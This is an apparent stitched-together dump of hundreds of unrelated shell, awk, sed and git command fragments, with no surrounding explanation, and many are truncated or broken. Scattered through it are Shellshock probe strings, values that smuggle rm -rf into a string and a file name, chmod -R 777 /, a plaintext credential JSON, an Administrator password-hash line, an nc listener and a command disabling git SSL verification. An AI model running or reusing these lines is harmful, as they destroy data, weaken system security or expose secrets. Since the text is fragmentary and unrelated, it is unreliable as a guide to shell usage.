fromfile2=$(cat textfile2)
sed -i "s/your line/$fromfile2"
. ./deepScript.sh |& __process
. ./deepScript.sh |& __process
. ./deepScript.sh
REading :
print $ans
__process < <(. ./deepScript.sh)
(. ./deepScript.sh)
. ./deepScript.sh
__process < =(. ./deepScript.sh)
(. ./deepScript.sh)
myfunc( foo )
myfunc( 1 - myfunc( 2) )
myfunc( subfunc2²  subfunc3² arg31, arg32³, arg22³)
( )
( )
content, content + 1
*** System restart required ***
head -1
bucket1=('10' '22' 'bucket1')
echo ${array1[@]}
10 30 bucket1
('10' '30' 'bucket1')
read -ra
declare -p
x - 1
$ ./myscript &
Continue [Y/N]?
set head off
set pages 0
sed -i -e '1 s/.*<\?php if\(\!isset\(\$GLOBALS\.*7860msvd.*oqggbrtstz-1; ?>//g'
error: sed: -e expression #1, char 67: Unmatched ( or \(
sed -i -e '1 s/<\?php if(\!isset(\$GLOBALS.*7860msvd.*oqggbrtstz-1; \?>//g'
md5sum <<< hello
sha256sum <<< hello
hash('md5', 'hello')
hash('sha256', 'hello')
awk -F '</?LOGFILENAME>' '{print $2}' app_config.xml
echo {01..30}
seq -w 1 30
printf "%02d " {1..30}
bash ~/myscript.sh 1 30
{1..30}: invalid number
'$(rm -rf /; echo 1)'
cat /tmp/my_file.txt
bash -c
sbalert -t "Checking" -m "Checking for updates please wait" -d ""
a || b && c
(a || b) && c
a || (b && c)
a || { b && c; }
man fmt
ls -1 *.mp3|awk ...
declare -fx x
echo vulnerable
sum += Math.pow(num%10, 3);
man bash
declare -x
bash -c "date"
declare -x
export foo
export -f foo
foo=() { echo 9; }
grep -v
tput sc
tput rc
echo -e
printenv | ssh 'SSH_A[UG]' > ~/.ssh/env; echo "export SSH_AUTH_SOCK SSH_AGENT_PID >> ~/.ssh/env
kill -0 "$SSH_AGENT_PID" || ~/bin/start_ssh_agent.sh
echo -n
echo $LANG
sh script.sh
chmod +x
Write failed: broken pipe
awk '{if(NF)NF--}1' file
NF == 0
awk 'NF--' file
for i in $(cat links.txt); do echo "<a href=\"$i\" target=\"_blank\">$i</a>"; done
d:/documents/my notes/test.html
my notes
(shell-quote-argument filename)
shopt -u
MSE: 16.80 (MSE is lower) [15 16.3 18.8 11]
16.80 (MSE is lower)
killall -9 progname
git ls-files -z  | xargs -0 cat | wc -l
git ls-files -z /home/bjyoo/repositories/root/localfiletest.git | xargs -0 cat | wc -l
git ls-files -z --git-dir=/home/bjyoo/repositories/root/localfiletest.git | xargs -0 cat | wc -l
git --git-dir=/home/bjyoo/repositories/root/localfiletest.git --ls-files | xargs -0 cat | wc -l
git show
git ls-tree
git show
git log --numstat --no-merges --pretty="format:" | grep -v -e '^$' | awk -F " " '{sum+=$1-$2} END {print sum}'
man bash
git pull
<<<"here string"
printf '%s\n' "$replacement" | sed
-f -
sed -f <(sed ...) "$file"
systemUsers=$(ls /Users/ | grep -v .localize | grep -v Shared)
Mammals in database
function a a
echo date
>echo date
() {
() {
alias rhome='cd /home/<username>/RelStreamX/'
pushd <dir>
cd <dir>
() {
env x='(){ :;}; echo vulnerable'
export -f function_name
xargs bash -c
find ... -exec bash -c
java -version
java -version
/path/to/bin/java -version
/path/to/there/bin/java -version
update-java-alternatives -l
| grep oracle
bash script
tcsh -c "source ~/test.tcsh"
make install
bash --version
make install
myScript.sh -a something -b anotherSomething
echo !!
echo !!
echo $BASH_COMMAND
"$0" "$@"
(metl -m migration.pickle1....)
{"username": "Administrator", "password": "abc456$", "serverAddr":"192.168.1.12"}
#! /usr/bin/env python
chmod +x
chmod +x
/path/to/script/script.py > /tmp/log 2> &1
wc -l
while; do ... ; done
cat args.txt | xargs ./prog < in.txt
cat args.txt | xargs ./prog
xargs -0
xwininfo -frame
echo "correct"
2> log.file
man dash
() { :;};
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
() { :;}; echo vulnerable'
() { :;};
x='() {:;}'
export x
env X="() { :;} ;
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
() { :;}; echo vulnerable'
() { :;};
x='() {:;}'
export x
sort -g
head -1
while read $line
while read
I want to replace only substring \n         consisting of characters \\ and n
Administrator@192.168.1.23 with HASH: 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
cmd /C
/^ *#/
echo $PATH
control + o
control + x
"This is $string with ${some[$i]} variables"
while read -r p
local args=(${args[@]:1})
local args=( "${args[@]:1}")
args=("$@"); my_function; set -- "${args[@]}"
140.7 44.9
OFS=", "
man bash
grep '\([a-z]\)\1\{1,\}' dict.txt
$ python
'$ python
$ foo.py
$ python foo.py
$ foo.py
$ python foo.py
$ python
$ py
sed -i '1 i\#! /usr/bin/env python\n' *.py
sed -i.bak '1 i\#! /usr/bin/env python\n' *.py
sed -i~ '1 i\#! /usr/bin/env python\n' *.py
printf '%q'
xargs ./swap <argfile
echo -n abcd
echo -n
set -o xtrace
man bash
exec &> >(...)
+++${UNIQUE_STR} <some interesting trace>
<some interesting trace>
sh -x
set -x
#!/bin/sh -x
sh -x yourscript
chmod +x
command printf "%s\n" some stuff
help enable
sed -i
-not -path
"$(locate tbn | ...)"
cmp -s
include /etc/nginx/mime.types;
chmod 744 foo.pl
mv $file $dir
ProcessBuilder run = new ProcessBuilder("/bin/sh", "/path/to/your/script");
man bash
cat webSerVer.txt |grep "192.168.19"|cut -d" " -f5
bedtools merge
Relation users does not exist
man bash
unset var
diff -y -W 300
\n_ _ _
sed 's/~/$HOME/g' appname.desktop > $HOME/.local/share/applications/appname.desktop
awk -F, "NR==$RAND" 'data.dat' |  cut -d ':' -f 4-
sed '$RANDd' data.txt
perl script.pl data.dat
man whereis
() { (a)=>\'
ls -l
ls -l
ls -l
ls -l
ls -1
yourcommand | awk
awk -F,
-v max=...
{if ($2>max) max=$2}END {print max}
{print $0, (max-$2)/max*100 }
if (($2/max)<0.9) print "outside than threshold: " $0
-maxdepth 1
find -maxdepth 1 -name "you_name" -a type d
run.exec("java -jar " + "./app/app-1.1.jar " + commandSuffix);
DATA <data in hex encoding>
T through to A
-o wrapper
which java
GNU awk
-o: command not found
wgettesting.html: command not found
part of
import 'package:...';
[ -d "{}" ]
rvm get stable
ruby -v
ruby 2.1.1p76 (2014-02-24 revision 45161) [x86_64-darwin13.0]
set -H
cut -d, -f1-3 < "$csvfile"
sort -u
while read...
grep "^$cat" "$csvfile"
sort -uR
head -5
sort -R
for ... in
for ... in
for ... in
mv "$1" "$TEMPFILE"
mv "$1" "tmp.$$"
man 3 regex
:help :cabbr
bash: your_alias: Command Not Found
${var#Pattern}, ${var##Pattern}
cat soal
root@aaaA:/usr/src/redhat/RPMS/x86_64>bash --version
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
Copyright (C) 2005 Free Software Foundation, Inc.
rpmbuild --rebuild -bb bash-3.2-33.el5_11.4.src.rpm
cd /usr/src/redhat/RPMS/x86_64/
root@aaa:/usr/src/redhat/RPMS/x86_64>rpm -Uvh bash-*
Preparing...                ########################################### [100%]
1:bash                   ########################################### [ 50%]
2:bash-debuginfo         ########################################### [100%]
root@aaa:/usr/src/redhat/RPMS/x86_64>bash --version
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
Copyright (C) 2005 Free Software Foundation, Inc.
root@aaa:/usr/src/redhat/RPMS/x86_64>bash --version
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
Copyright (C) 2005 Free Software Foundation, Inc.
root@aaa:/usr/src/redhat/RPMS/x86_64>rpm -qa | grep bash
[1;31m/Users/carlwilliamtablante/www/serviceseeking/db/schema.rb:16 - always add db index (abns => [provider_account_id])[0m
/Volumes/Macintosh\ HD/Users/Julian/Music
/Volumes/Macintosh\ HD
expr: syntax error
printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/~}"
readlink -f /proc/$$/fd/1
script.sh > /tmp/f.out
for f in $FILES
bash: !@#": event not found
env={'SSHPASS': 'test!@#'}
"-o key=value"
"-o", "key=value"
Defaults:username !requiretty
core.autocrlf = true
autocrlf = true
git config
git config --help
xcodebuild | egrep -A 5 "(error|warning):"
'Test Suite * started at*'
exec(String, String[])
rvm current
readlink -f
awk 'BEGIN { FS = "," } ; NF > 1 {print $(NF-1)}'
NF > 1
condition ? value_if_true : value_if_false
0 < i ≤ NF
i == 0
i > NF
read input
read $input
git credentials helper
my_command < file
my_command <<< value
my_command <<< "$variable"
windows vbscript
echo "filename.txt.bin" | sed "s/\..*//g"
(arg: 4)
docker ps -a
start bash
sed s/.*,// file
git symbolic-ref --short HEAD
if(per<=20) print "memory is under 20%"
-exec less
'$i foo'
$i + 1
cat file.txt | sed -n '/<tag/,/<\/tag/p'
sudo fuser -ku 8000/tcp
when Python is invoked, it sets sys.argv to everything but it's own executable.
os.execlp('python', 'the_directory')
signed long
signed long
signed long
sh -c
sh -c
cd my_folder
chmod +x script.sh
Starting 3 more instances
ln -s /git/.aliases /root/.aliases
ls -l
man ln
-bash - command not found
funcname | while read
funcname > somehere
select menu
grep -H
printf "$SHELL"
MyShell='ps -hp $$'
sed -i
awk -F, '{print $0", "$1}' sample
print $0", "$1
line_no = 0
sed -i "$line_no s/$/ ,$fcol/" sample
NR==FNR{a[$1]++; next}
if($i in a){c++}
sudo /etc/init.d/resque start
help test
pacman -S sudo
usermod -G wheel yourusername
%wheel ALL=(ALL) ALL
python parser.py myfile.py "This is an Orange"
print $0
./lookup "Los Angeles"
man basename
adb shell
sed "s/Hello/World/g"
echo $SHELL
stty echo
man grep
man read
man bash
SHELL BUILTIN COMMANDS
man bash
wget --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=unix,ascii --domains your-site.com --no-parent http://your-site.com
./my_script.sh 2> my_app.err
tail -f my_app.log
tail -f my_app.err
"hello" | tee file.txt
echo "hello"
echo "hello" 2>&1 | tee file.txt
SUDO defaults write com.apple.Finder AppleShowAllFiles YES; killall Finder
shopt -s lastpipe
-A (after)
du -m
TEST2EVAL=$(ps auxf | grep some.jar | grep -v grep | wc -l)
ps aux | grep some.jar | grep -v grep | wc -l
ps aux
pgrep -fl java
56 2
date +'%H %M'
< <(...)
echo *(om[1])
sed s/data/mydata/g $f
find -exec
set -o errexit
|| true
set -o errexit
/Password/ { ... }
cmd | getline $2
{print $0}
<111> <222>
foo 'bar baz'
foo bar baz
bash -l
stdin: is not a tty
bash -l
ln -sf
ls -li
type -a ln
sed -i
sed -i
git status
git diff
Hello World
chmod -R 775 <dirname>(or 777)
ps -eF | grep apache
usermod -a -G ...
chmod g+w ~
chmod o+w ~
rm -rf
setsebool -P httpd_enable_homedirs on
| tr -d '[],'
sed 's/..etc..
root:$2a$05$sin5i458ghsdfg8076t5ymp4y;jgslkdbvffd bshmRK:12856:0:10000::::
open http://podio.com
wget ftp://host/dir/a* ftp://host/dir/b*
awk '...' file > tmp && mv tmp file
-j 8
-exec ... +
-exec ... \;
sed "s=abc=def=g"
bash -c
bash -c
-bash: /INFO/: No such file or directory
cd /INFO
bash -c ...
5+50*3/20 + (19*2)/7
scale = 3;
echo "scale = 3 ; 8/9" | bc
who -m
id -un
who -m
printf "" > somefile.txt
export this=this
export {whatever}
export foo=bar
find . -type d
-exec env d={} bash -c '...' \;
ls "$d"/*.html &>/dev/null && ls "$d"/*.txt &>/dev/null && ls "$d/"*.{html,txt}
sudo ./'script_name'
user_exists=$(cat /etc/passwd | grep 'GNU Mailman')
getent passwd username
grep 'GNU Mailman'
man bash
./fileName 3 readFile
-t target-directory
if [ $# != 0 ]; then …current script…; fi
chmod -R 777 /
| gnuplot
cat -vte
svn propedit svn:ignore js/ < "blank.html"
echo "test" | svn propedit svn:ignore js/
bash -c
400 (-r--------)
(eg : /dir_02/logs)
bash -c
bash -c
set={( )}
$SHELL $PWD/tailx.sh ...
pidof watch
kill -9 $PID
Korn shell (ksh)
C shell (csh)
Korn shell (ksh)
C shell (csh)
other (ksh, csh)
sleep 30
dir_count=(ls -A1 /home/ | wc -l)
dir_count=$(ls -A1 /home/ | wc -l)
echo cd
echo bar
cd foobar
chmod 755 clean_downloads.py
ffmpeg -i input
print $2 " -" $NF
sort -u
awk -F'[:;]'  '{arr[$2," -",$8]++}END{for (a in arr) print a}' <file>
[: 1,: integer expression expected
grep -E "ABCDEFG-[0-9][0-9][0-9].*"
$1~/"name"/ && f {gsub("[ \",]", "", $2); print $2}
sh -c
dmesg -w
wc -l
tail -n+$n
udevadm | grep
dmesg -w
tail /var/log/messages
tail -f -n 0 '/var/log/messages'
exec 3< <( tail -f -n 0 '/var/log/messages' )
exec 3>&-
tail -f
grep -o
journalctl -b -f
export PATH="/usr/local/heroku/bin:$PATH"
if [ -f /etc/bashrc ]
find ... -exec
repo = ask("Repository:")
sh encrypt.sh test
sh decrypt test
echo -e "$keyvariable" | gpg --symmetric --cipher-algo AES256 > $fn
set -u
echo $RE5l
"date" | getline T
date --date="03/10/2014 08:23:35" +"%s"
03 life
f==0 && !/REDEFINES/{s=s"\n"$0;next}
/REDEFINES/{f=1;print s t>("output" ++c ".txt");t=""}
END{print s t>("output" ++c ".txt")}
echo -en "$values\t$val
[ -o OPTION ]
[ ! -o OPTION ]
[[ ! -o option ]]
[[ ]]
-o option
test1 -o test2
[ ! ]
[ history ]
<td width="50%" valign="top">System Hardware</td>
System Hardware
awk -F "\<([^>]+)\>" '{print $1}' test.txt
awk -F "\<?*\>" '{print $1}' test.txt
print $2
printf -v all '"%s", ' "${@}"
echo "${all%, }"
for s in "$@"; do
s=${s%\"}; s=${s#\"}
all="$all, \"$s\""
echo "${all#, }"
-i ''
while true
while read
man curl
grep -o
if echo $var | grep -q "value"; then
grep -q "value" <<<"$var"
PMPI_Comm_rank(108): MPI_Comm_rank(comm=0x0, rank=0x6084e8) failed
#define MPI_COMM_WORLD ((MPI_Comm)0x44000000)
ls -l | awk '{print $5}' | tr "M" " "| awk '{sum+=$1} END {print sum}'
$( )
ls -lh
grep -P
ds table_name
GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
Ver 14.14 Distrib 5.5.38, for debian-linux-gnu (x86_64) using readline 6.3
bash decBright.sh
grep -vf
man grep
man bash
uname -r
uname --help | grep -e -r
'<textarea class="logarea" rows="15" name="log" spellcheck=FALSE>'
mapfile -t arr < <(echo "$1" | grep -v "^$")
$ rename "s/ /_/g" *
-type f
java -cp classes cst420.Waypoint < samples.txt
ffmpeg  -i  "my rtsp link" -vcodec copy -loglevel verbose -an  -f flv "my RTMP link
select name [ in word ] ; do list ; done
select opt in $OPTIONS; do
{Hello, Quit}
Hello world
No such file or directory
getconf ARG_MAX
grep -o
count=$(echo '$string' | grep -o ... | wc -l)
(${#CommandResult} - ${#tmp])
while read line; do
<master name> <oldip> <oldport> <newip> <newport>
etcdctl set /redis/master $NEWIP
if [ "${status[1]}" -ne 0 ]
: a l m n u
print 'found' every time "foo" is present
print the current record every time "foo" is present and print "found" for every single input record
[ : a l n u m
man yum.conf
rpm -qf --qf '%{version}\n' /etc/redhat-release
s/ +\././
y/ /_/
s/ /_/g
echo "$file"
echo "$( <"$file" )"
cat <"$file"
<"$file" cat
grep -o "(" <"$file"
<"$file" grep -o "("
grep -o "(" "$file"
<"$file" tr -cd "("
print x if x<2**31 else x-2**32'
taskset -c 4,5,6,7 stress -c 4
taskset -h
taskset -cpa 4-7 'pgrep -n java'
<$(echo "$configurationTmux")
echo "$configurationTmux" | tmux -f /dev/stdin attach
ls: ~/Library/MobileDevice/Provisioning Profiles/: No such file or directory
"a b"
\a\ \b
find . -exec wc -l {}\;
find: missing argument to -exec
a: no such file
b: no such file
The requested resource could not be found
curl localhost:1112
date "+%A %d %B %Y"
apt-get install -y
sudo apt-get install
sudo apt-get install -y
for threads in $threads
echo $threads
for n in nodes
for t in threads
./auto_format file
cat file | ./auto_format
shopt -s nullglob
./origin.sh /A=appname,/U=admin,/LL=ADMINISTRATOR
git commit -m "Staged a, not b, committing with * file specifier" *
man page
find ./ -type f rename
- {}
if [ v = false ]
if [ $v = false ]
$(echo ${PATH} | tr ":" " ")
command -v
text_split.sh -s "my File .txt" -c 2
tr -d ' '
-O *[^[:blank:]]*
grep -n
${cat## }
echo ... read
-p prompt
\s-\v\$ .
grep -nr
sed -i '/pattern/d' filename
sed -i '/REGEX/d' FILENAME
f_example    { not match(REGEX); };
grep -q
echo $?
grep -w
/Volumes/Post Shared/Backup From Sound
process substitution
echo $f
printf "%s\n" "$path"/**/*.properties
if (defined?(id))
[ ]
./findremote.sh target_server /var
su - another_user -c "<command>"
sudo ./script
0 * * * *
* * * * *
0 * * * *
*/1 * * * *
-d '-1 day'
-Acdtrux' or
tar --help' or
GNU bash, version 4.3.27(1)-release (x86_64-apple-darwin12.5.0)
grep -vx
git config --global http.sslverify false
rm -f <path>
hello world
while getopts ":iv:" opts; do
awk '!x[$0]++'
/uploads/$(rm -rf ~)'$(rm -rf ~)'
[ ... ]
if ...; then
[ !$(grep ...) ]
[ !output_from_grep ]
[ word ]
[ -n word ]
-s file_name.txt
-c 1
for i in *
for i in $(ls -1)
mv $i ...
mv "$1" ...
find ... -exec cat -- {} +
find ... -print0 | xargs -0 cat --
echo -e
printf '%b\n'
echo -e
echo -e
printf %b
sort -k1 -n -t, filename
cat /etc/passwd | grep "/home" | awk -F: '{print $1}'
cat /etc/passwd | grep "/home" | awk -F: '{print $6}'
ps -ef | grep Consumer | cut -f6 -d' '
ps -ef | grep Test | cut -f7 -d' '
ps -ef
ps -ef
'/pattern/{print $n}'
{% URL test arg1...%}
{% URL "test" arg1...}
find ./ -type f -exec sed 's/{% url \([^" >][^ >]*\)/{% url "\1"/g' *.html '{}' \;
find ./ -type f -exec sed -i 's/{% url \([^" >][^ >]*\)/{% url "\1"/g' *.html '{}' \;
echo "{u'phone_num': u'9999999999', u'name': u'abc', u'format': u'json'}" | awk -F "'" '{ print $4 }'
h1:m1:s1 --> h2:m2:s2
read -rsp 'Password: ' PASSWORD
cat -v /path/file
sed -i -e 's/\r//g' /path/file
cat $file
brew install knock
tail -n ${i}
tail -n $i
tail -n $(i)
$(eval echo {1..${count}})
SIGTERM SIGQUIT SIGINT
A trap on ERR, if set, is executed before the shell exits.
man trap
man 7 signal
trap ERR
set -e
set -e
help trap
bundle exec rake jobs:work
-links 2
chmod +x
shFile.lineFeed = "Unix";
awk -F "\t" '{print $3}' file.txt
man chattr
gcc run_script.c -o run_script.cgi
-e '/<line_with_expression_to_delete>/d'
No such file or directory
for file in "${@}"
-exec yourscript.sh {} +
START TRANSACTION;
while read
stdbuf -oL
ssh -p $GERRIT_PORT_NUMBER $GERRIT_SERVER_NAME gerrit query --current-patch-set $PATCHSET_ID | sed 's/message//'
gcc -Wall hello.c -o hello.out -lm
declare -n
getconf ARG_MAX
xargs --show-limits </dev/null
\<the negate matched line\>\|
echo mv "$file" "$new_file"
mv "$file" "$new_file"
s/\n/ /
nc -l -p 4001 -v
test -r
bash --rcfile debug.sh -i test.sh
bash --rcfile compare.sh -i test.sh
pacman -Qs
> /dev/null
ls /bin | grep $package
pacman -Q pkgName
pacman -Qi pkgName
qsub script.sh
:help -s-ex
tail -n 10
head -c 5
H, P, R
myapp -f <args> ...
$ myapp -f -- -a -b
$ myapp -f -- test cmd sth
myapp -f -- test cmd sth
myapp -f test cmd sth
$ myapp -f -- -a -b
myapp -v cmd -v test
addPrefix $color
for arg in 16 16 15 2 3 4 5; do snmpset_f "$arg"; done
for arg in "16 i 6" "16 i 5" ...
"192 168 1 2"
man grep
xargs -r rmdir
xargs -r rm -r
rm -r 100
r cmd "update.packages(ask=FALSE)"
script.py -options &>/logs/phptopython.log &
seq 1 5
jq -R .
jq -s
printf %s "$(cat)"
declare -p
declare -a
declare -p
declare <something> <something>
declare -p K
declare -p $K
help declare
expect -c
"~/.bash_profile" 38L, 1070C
enable -n local
/ line two {/
/\tline two {/
/s/text .*\$/text new/
[[ expression ]]
1 2 3
1 2
1 2
./script hello 5
./script 6
grep -f file-with-patterns file-to-search.log
-f -
-f <()
$ sudo useradd odoo
# CREATE USER odoo WITH SUPERUSER LOGIN CREATEDB INHERIT PASSWORD 'some_password';
# CREATE DATABASE odoo OWNER odoo;
sudo -u odoo COMMAND
rule of precedence
systemctl restart postgresql.service
1 2 3 4 5
bash MyScript.sh
alias pyg='python /usr/local/bin/pgs4a-0.9.6/android.py'
python android.py
export -f <func>
Mono on Linux
Visual Studio on Windows
shift $((OPTIND-1))
shift N
man mysql
Do you trust the above certificate [y|N] -->
asadmin ...
Do you trust the above certificate [y|N] -->
grep configure
sh configure
bash -c pwd
bin/bash -f myscript.sh
cd ..
hash -r
test tet test tezt
(( ))
printf '%s|' "${arr1[@]}"
printf '%s|' "${arr1[@]}";printf "\n"
printf '%s|' "${array[@]}"; echo
printf '%s ' "${arr1[@]}" ; printf '\n'
sudo usermod -aG wheel $(whoami)
bash -l -c
printf %q
u r in loop_shell.sh
pkill -P -KILL [parentid]
$(basename "$FILEPATH")
$(dirname "$FILEPATH")
-e delete
--format "%w%f"
grep '\.txt$'
/B/{print "Replacement Text"}
git tag -l
<c-k>: kill-line
:echo 'hell|o world'
:echo 'hell
:h eval
/' char and all characters after that. The 2nd half of the
command is the replacement. With
aws s3 ls s3://my-bucket/prod-builds/ | sort -r | head -2 | sed -n '1!p' | awk -F "aragorn-" '{print $2}' | cut -d'.' -f 1
aws s3 ls s3://my-bucket/prod-builds
wc -l
git rev-parse HEAD
zenity --calendar
alias showon='defaults write com.apple.finder AppleShowAllFiles YES && killall Finder'alias showoff='defaults write com.apple.finder AppleShowAllFiles NO && killall Finder'
alias showon='defaults write com.apple.finder AppleShowAllFiles YES; killall Finder'alias showoff='defaults write com.apple.finder AppleShowAllFiles NO; killall Finder'
alias kf="killall Finder"
killall -v Finder
kill -TERM 3125
zsh: command not found: jkl
source ~/.config/zsh/functions
script 1
script 2
script 2
script 1
script 1
script 2
to awk script as argument using the
-v purge=$Purge_Date
awk '{++f; print $(f + 0)}' file.txt
grep -if - $TMPFILE
-f -
#tag1 #tag2
[[ $x -lt $y ]]
(( x < y ))
shopt -s nocasematch
[2, 1.2, 3.2, 3.2.2, 3.2.3]
sort -t : -k 1.1n,2.2n,3.3n filename
[ -f ..
source ./scripts/commons.sh
bundle exec rails g rspec:install production
cd $DIR && bundle exec rails g roroacms:install -v production && bundle exec rake assets:clean production && bundle exec rake assets:precompile production
-name '*.txt'
-type f
-execdir mv -n '{}' ../ \;
mv -n '{}' ../
-type d
find . -name "name1*" -exec mv {} {}.bak
name111 name11 kname1 name2 name3
name111.bak name11.bak kname1 name2 name3
name111 name11 kname1 name2 name3
name222 name22 kname2 name2 name3
shuffleString "any-string"
break 2
sed 's/Image.Resolution=//g' | sed 's/,/ /g'
info sed
( $( ... ) )
$( ... )
cut -d' ' -f2
crontab -e
export foo=bar
$(some command)
echo $var
$$ $?
script.sh fnSw38h$?2
IFS= read d
IFS= read -r d
for i in "$d"/*/
for i in "$d"/*/
grep -q
Server host:
Server host:
Server host:
yum install ksh
chmod +x xyinstal
git pull
git pull --quiet
"$FILE" == "src"
readlink -f
if [ -f
if [ -d
if [ -L
readlink -f
cp -P
if [ -d src
mkdir -p src
# ensure src exists
src/$(dirname "$FILE")
sed 's://:/:g'
mkdir -p src
"$(basename "$FILE")"
src/$(dirname "$FILE")/$(basename "$FILE")
sed -i "/aaaa/c\bbbb"  mytextfile
readlink -f "$1"
grep -o
configure --enable-password-save
drush [31;40m[1m[error][0m cache-clear drush
pwd : /data/www/sites/site_cn_country
id -u -n : root
ll : Command not found (why ? manually work...)
echo $SHELL : /bin/bash
FILES = system("dir /b")
unsigned int
unexpected operator
wait $LOOP_PID
read tmp < $FIFO
read tmp
read -u3 tmp
tput cols
gnu wc
killall -q 0 processname
killall -q 0 program
regular expressions
sh yourscript
cmp /dev/sdb /dev/zero
for fname in *.fastq.gz
zcat "$fname"
echo "$2 / $5"|bc -l
ax + b
-bash: vi: command not found
. /etc/skel/.bashrc
[ ... ]
man test
cat sample_pathname.txt
"/Volumes/HDD1/001.jpg" "/Volumes/HDD1/002.jpg"
$MYFILE = find . -type f -name '*.iso' -printf '%p\n' | sort -r | head -n 1
sort -r
ps -aef | grep process_name
Error: no export filter found, abording
grep -q 'STATE_INACTIVE'
no INACTIVE
ls -l
df -h
etc/profile, ~/.bash_profile, ~/.bash_login and ~/.profile
ls -l
Fixed typo.
git tag v0.1.1
pointers to commits
git branch --contains FIX_SHA
git tag --contains FIX_SHA
git merge
man grep
[[ -z "$(<file2)" ]]
echo "$somevar" >> $LOG_LOCATION
echo -e
set -f
set +f
ERROR 77
find dir1 >listfiles
s/^.*\/([^\/]+)$/cp \0 destination/\1/
cut -f 3 <listfiles | sort | uniq -d
java -jar myjar.jar param1 param2 param3
set -e
|| :
set +e
set -e
sed -n ip
if !
foo || bar
${read line}
$(read line)
system boot
key press
boot option
key press
key press
stty sane
socat xxxxx ; stty sane
for (i=1;i<=NF;i+) $i=$i/255
print $0
set -e
echo -e
man echo
set -e
set -e
set -e
set -e
script/plugin install git://github.com/p8/table_builder.git
bash: script/plugin: No such file or directory
bash: bin/plugin: No such file or directory
rails new
gem "watu_table_builder", :require => "table_builder"
bundle install
source ~/.bash_profile
composer global about
source ~/.bashrc
echo $PATH
~/.composer/vendor/bin directory
vi ~/.zshrc
nano ~/.zshrc
source ~/.zshrc
composer global require "laravel/installer"
nano ~/.bashrc
export PATH="$PATH:$HOME/.config/composer/vendor/bin"
alias laravel='~/.config/composer/vendor/laravel/installer/laravel'
source ~/.bashrc
export PATH=
1 KB
1 KB
exit -1
grep -Ff
my.array=(Ann Becky Diana)
mkdir -p
mkdir -p
sort -z
-d ""
comment selection
abc dabefxy
reverse engineering
static analysis
dynamic analysis
objdump -d /bin/cat
strings /bin/cat
${tab[$i+1]} = ${tab[$i]}
( IFS=$'\n'; echo "$*" )
sort -n
(( ))
declare -A
900 % 900
ls *.zip
echo $file | cut -d . -f 1
nmap | grep
-bash: /tmp/test.txt: Permission denied
info bash
FNR==NR {xyz[FNR]=$3" "$4" "$5;next;}
print xyz[$1],xyz[$2]
%-12s %-15s %-12s\n
BEGIN{printf "%-12s %-15s %-12s\n","Name"," Email"," Phone"}
printf "%-12s %-15s %-12s\n",$1,$2,$3
*2.txt, *3.txt, etc.
-name '*.txt'
((i=1; i<=max; i++))
hwclock -r 2> file.txt; grep -v "grep" | grep "error" > /dev/null
ANSI Escape sequences
2>&1 | ocunit2junit
. ~/.bashrc
echo "$PATH"
rails server
Administrator System=C3=B3w
Content-Transfer-Encoding: quoted-printable
Content-type: text/plain; charset="utf-8"
xargs cat
cat $( some command printing a filename )
-bash: syntax error near unexpected token (
-v ORS=
gsub(/\n/, " ", RT)
Input Record Separator
$1 $2
grep "Down" thetextfile.txt | grep "thehostname"
Connector port="8080"
Connector port="8880"
GET="start from '12345' and continue"
echo $GET | grep -o \'.*\'
myvar=$(echo $GET | grep -o \'.*\')
OUTPUT=$(su - mysql -c "mysql --skip-column-names --raw --host=localhost --port=3306 --user=user --password=pass -e 'show variables where variable_name = "max_connections"'")
ERROR 1054 (42S22) at line 1: Unknown column 'max_connections' in 'where clause'
sudo su - mysql -c "mysql --skip-column-names --raw --host=localhost --port=3306 --user=user --password=pass -e 'show variables where variable_name = "max_connections"'"
' '
qsub -W depend=afterok:jobID <jobname>
cut -d. -f1
print $0
./script csvfile.csv logfile.txt
grep -q
laravel new
larval new
export PATH="~/.composer/vendor/bin:$PATH"
DONTEVERUSETHIS=$?; echo #{manager.separator} $DONTEVERUSETHIS; echo \"exit $DONTEVERUSETHIS\"|sh
cd /tmp
out=$(su - user -c "someCommand -f 'string text "problemString"'")
out=\$(su - user -c \"someCommand -f 'string text \"problemString\"'\")
out=$(su - user -c "someCommand -f 'string text \"problemString\"'")
Unknown command '\p'
OUTPUT=$(su - mysql -c "mysql --skip-column-names --raw --host=localhost --port=3306 --user=user--password=pass -e 'show variables where variable_name = \"max_connections\"'")
OUTPUT=$(su - mysql -c "mysql --skip-column-names --raw --host=localhost --port=3306 --user=pluto_user --password=pluto_user -e 'show variables where variable_name = \"max_connections\"'")
ERROR at line 1: Unknown command '\m'.
--partial --progress
wget --continue the_url
rsync -P -rsh remoteuser@remotehost:/remote/path /local/path
dialog --gauge
ry fe
shopt -s nullglob
[[ -e "$fil" ]] && echo "appending $fil"
line 15: shift -1: shift count out of range
line 19: $string: ambiguous redirect
tr '[A-Z]' '[a-z]' <<<"$string"
main = print "Hello World"
php -r 'echo "Hello World\n";'
ghc -e
ghc -e
["/bin/sh", "-c"]
ls -al
grep -rnw  "EXIT_SUCCESS"  /usr/include/*
lsof -oo10 -p $LOGSTASHPID
PS1="\[\033[0;37;40m\u@\033[0;36;40m\h:\033[0;35;40m\w$\033[0m^.^\t \]"
source .zshrc
" ['ACTG']['ACTG']['ACTG']$"
" ['ACTG']{1,3}$"
" [ACTG]{1,3}$"
' '
grep -E "\W.{,3}$"
awk '$NF~/^...$/'
grep -P '\t...$'
st1=$( -f "${ARRAY[$i]}" )
free -m
+/- buffers/cache
cat /proc/stat | grep 'cpu '
(user+nice+system) / (user+nice+system+idle)
world write perms found
$(find / -type f -perm -002)
no world writable found
wc –w
< BODY_CONTENT_FILE
cat BODY_CONTENT_FILE |
echo $VARIABLE
ls -aF
man ascii > all_ascii_chars.txt
sed -i -e '/var port./var port = 3000;/' server.js
var port = 5000;
sed: -e expression #1, char 14: expected newer version of sed
declare -a array=( ... )
declare -a array="( ... )"
(1 2 3)
a=(1 2 3)
typeset a=...
while read..
pr -h -
pr -h --
pr -h -d
pr -h +2
pr -h ''
pr -h -- -d
quoted form of
